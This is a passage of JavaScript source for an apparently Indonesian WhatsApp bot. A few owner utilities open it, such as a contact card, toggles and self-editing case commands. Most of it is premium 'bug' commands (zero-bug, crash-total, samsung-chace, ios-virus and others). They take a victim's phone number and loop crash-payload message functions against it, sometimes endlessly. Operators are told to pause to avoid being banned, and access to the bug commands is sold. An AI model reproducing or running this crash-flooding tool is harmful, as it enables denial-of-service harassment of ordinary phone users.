┃⭔ Ram : ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
┃⭔ Runtime : ${run}
┗❐

`)
}
break
//=================================================//
case 'owner': case 'botowner':
let namaown = `Owner Cakep`
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${namaown}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.ownMain}:+${global.ownMain}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:[[ ༑ 𝐋𝐞𝐗𝐜𝐙 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nX-WA-BIZ-NAME: [[ ༑ 𝐋𝐞𝐗𝐜𝐙 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`,
}
}), { userJid: m.chat, quoted: m })
ryozingod.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
break

case 'shutdown': {
if (!isDeveloper) return joreply(mess.owner)
joreply(`Otsukaresama deshita🖐`)
await sleep(5000)
process.exit()
}
break
//=================================================//
case 'autorecord':
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 1) return joreply(`Example ${command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoRecord = true
joreply(`Successfully Changed Auto Record To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autoRecord = false
joreply(`Successfully Changed Auto Record To ${q}`)
}
break;
//=================================================//
case 'autoread':
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 1) return joreply(`Example ${command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoread = true
joreply(`Successfully Changed Auto Read To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autoread = false
joreply(`Successfully Changed Auto Read To ${q}`)
}
break
//=================================================//
case 'autotyping':
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 1) return joreply(`Example ${command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoTyping = true
joreply(`Successfully Changed Auto Typing To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autoTyping = false
joreply(`Successfully Changed Auto Typing To ${q}`)
}
break
//=================================================//
case 'autobio':
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 1) return joreply(`Example ${command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autobio = true
joreply(`Successfully Changed Auto Bio To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].autobio = false
joreply(`Successfully Changed Auto Bio To ${q}`)
}
break
//=================================================//
case 'onlygroup':
case 'onlygc':
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 1) return joreply(`Example ${command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].onlygrub = true
joreply(`Successfully Changed Onlygroup To ${q}`)
} else if (q == 'off') {
db.data.settings[botNumber].onlygrub = false
joreply(`Successfully Changed Onlygroup To ${q}`)
}
break
//=================================================//
case 'listpc': {
if (!isDeveloper) return joreply(mess.owner);
let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
let teks = `*Private Chat*\nTotal: ${anulistp.length} Chat\n\n`
for (let i of anulistp) {
let nama = store.messages[i].array[0].pushName
teks += `*Name :* ${pushname}\n*User :* @${sender.split('@')[0]}\n*Chat :* https://wa.me/${sender.split('@')[0]}\n\n───────────\n\n`
}
joreply(teks)
}
break
//=================================================//
case "addcase": {
if (!isDeveloper) return joreply(mess.owner);
if (!q) return joreply(`Masukan Input`);
if (!q.includes("|")) return joreply("Format perintah tidak valid. Gunakan: addcase <tempat>|case \"casenya\">{ ... } break")

let tempat = q.split("|")[0];
let casenya = q.split("|")[1];
let newCase = casenya

let fileContent = fs.readFileSync("./ryozingod.js", "utf-8");

let breakIndex = fileContent.indexOf(`break\n`, fileContent.indexOf(`case "${tempat}":`));

if (breakIndex !== -1) {
fileContent = fileContent.slice(0, breakIndex + 6) + newCase + fileContent.slice(breakIndex + 6);

fs.writeFileSync("./ryozingod.js", fileContent, "utf-8");

joreply(`Case baru "${casenya}" berhasil ditambahkan di bawah case "${tempat}"!`);
} else {
joreply(`Tidak dapat menemukan break di case "${tempat}".`);
}
}
break
//=================================================//
case "delcase": {
if (!isDeveloper) return joreply(mess.owner);
if (!q) return joreply("Masukkan nama case yang ingin dihapus, contoh: delcase gpt4");

let caseName = q

let fileContent = fs.readFileSync("./ryozingod.js", "utf-8");

let startIndex = fileContent.indexOf(`case "${caseName}"`);
let endIndex = fileContent.indexOf("break", startIndex);

if (startIndex !== -1 && endIndex !== -1) {
let caseToDelete = fileContent.slice(startIndex, endIndex + 6);
fileContent = fileContent.replace(caseToDelete, "");

fs.writeFileSync("./ryozingod.js", fileContent, "utf-8");

joreply(`Case "${caseName}" berhasil dihapus!`);
} else {
joreply(`Tidak dapat menemukan case "${caseName}" untuk dihapus.`);
}
}
break
//=================================================//
case 'remini': case 'hd': case 'hdr': {
if (!quoted) return joreply(`Fotonya Mana?`)
if (!/image/.test(mime)) return joreply(`Send/Reply Foto Dengan Caption ${command}`)
joreply(mess.wait)
let media = await quoted.download()
let proses = await remini(media, "enhance");
ryozingod.sendMessage(m.chat, { image: proses, caption: '_Maaf Kak, Kalau Hasilnya Nggak Bagus_ T_T'}, { quoted: m })
}
break

//Owner fitur
case 'addakses': {
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 2)
return joreply(`Penggunaan :\n*#addakses* @tag waktu\n*#addakses* nomor waktu\n\nContoh : #addakses @tag 30d`);
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
addPremiumUser(m.mentionedJid[0], args[1], orgkaya);
}
joreply("Sukses Akses")
} else {
addPremiumUser(args[0] + "@s.whatsapp.net", args[1], orgkaya);
joreply("Sukses Via Nomer")
await sleep(2000)
ryozingod.sendMessage(args[0] + "@s.whatsapp.net", {image: {url: `https://telegra.ph/file/e7f01b0a8ae36bcc73db8.jpg`}, caption: `Kamu sekarang Dapat Akses Bug`},{quoted: qevent })
}
}
break
//=================================================//
case 'delakses': {
if (!isDeveloper) return joreply(mess.owner)
if (args.length < 1) return joreply(`Penggunaan :\n*#delakses* @tag\n*#delakses* nomor`)
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
let mentionedPremiumIndex = orgkaya.findIndex(premium => premium.id === m.mentionedJid[i]);
if (mentionedPremiumIndex !== -1) {
orgkaya.splice(mentionedPremiumIndex, 1);
}
}
fs.writeFileSync("./dtbs/premium.json", JSON.stringify(orgkaya));
joreply("Sukses Delete");
} else {
let targetNumber = args[0] + "@s.whatsapp.net"
let targetPremiumIndex = orgkaya.findIndex(premium => premium.id === targetNumber)
if (targetPremiumIndex !== -1) {
orgkaya.splice(targetPremiumIndex, 1)
fs.writeFileSync("./dtbs/premium.json", JSON.stringify(orgkaya))
joreply("Sukses Via Nomer")
await sleep(2000)
ryozingod.sendMessage(targetNumber, {image: {url: `https://telegra.ph/file/e7f01b0a8ae36bcc73db8.jpg`}, caption: `Kamu sekarang adalah Anggota Premium`},{quoted: qevent })
} else {
joreply("Entitas premium tidak ditemukan")
}
}
}
break
//=================================================//
case 'tourl': {
joreply(mess.wait)
let media = await ryozingod.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await uptotelegra(media)
joreply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
joreply(util.format(anu))
}
}
break

//Group Menu
case "resetlinkgc": case "revoke":{
if (!isPremium) return joreply(mess.premium)
if (!isGroup) return joreply(`Khusus Group Bego`)
if (!isAdmins && !isDeveloper) return joreply('Khusus Admin')
if (!isBotAdmins) return joreply(`Bot Bukan Admin Bego`)
await ryozingod.groupRevokeInvite(m.chat).then((res) => joreply(`Sukses riset link group`)).catch((err) => joreply(jsonformat(err)))
}
break
//=================================================//
case "kick": {
if (!isGroup) return joreply('Only Group')
if (!isAdmins && !isDeveloper) return joreply('Only Admin')
if (!isBotAdmins) return joreply(`Bot Bukan Admin:(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ryozingod.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => joreply(util.format(res))).catch((err) => joreply(util.format(err)))
}
break
//=================================================//
case 'zero-bug': case 'bug-s': case '🐑': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'rog': case 'coli': case 'kentang': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'fatal-notif': case 'fatal-ui': case 'crash-total': case 'forces-sql': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'revankontol': case 'ewe': case 'nokia123': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await bakdok(target, force)
await ngeloc(target, force)
await bakdok(target, force)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'samsung-chace': case '🤡': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'bug-recover': case 'not-human': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 50; j++) {
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'stardust': case '👿': case '😈': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 40; j++) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'impossible': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 40; j++) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'bug-rom': case 'restart-ui': case '☠️': case '💀': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'shock': case 'wave': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'virg4m': case 'crashganas': case '🥶': case '🤪': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 10; j++) {
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'surprise': case 'lexunlimited': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 10; j++) {
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'sipilist': case '1hit': case '🗿': case 'mimir': case '1shoot': case '🙀': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 1; j++) {
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'st4rdust': case '😭': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 3; j++) {
await ngeloc(target, force)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'gada-ampun': case 'bug-24j': case '😂': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (;;) {
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await sleep(30000)
}
await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'samsung-24j': case '🥰': case '🌷': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
  for (;;) {
    await ngeloc(target, ryobug)
  }
  await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'ios24j': case 'vios-unli': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
await joreply(mess.bugrespon)
let target = bijipler + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
  await joreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
//=================================================//
case 'ios-kentang': case 'ios-virus': case 'nonstop': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
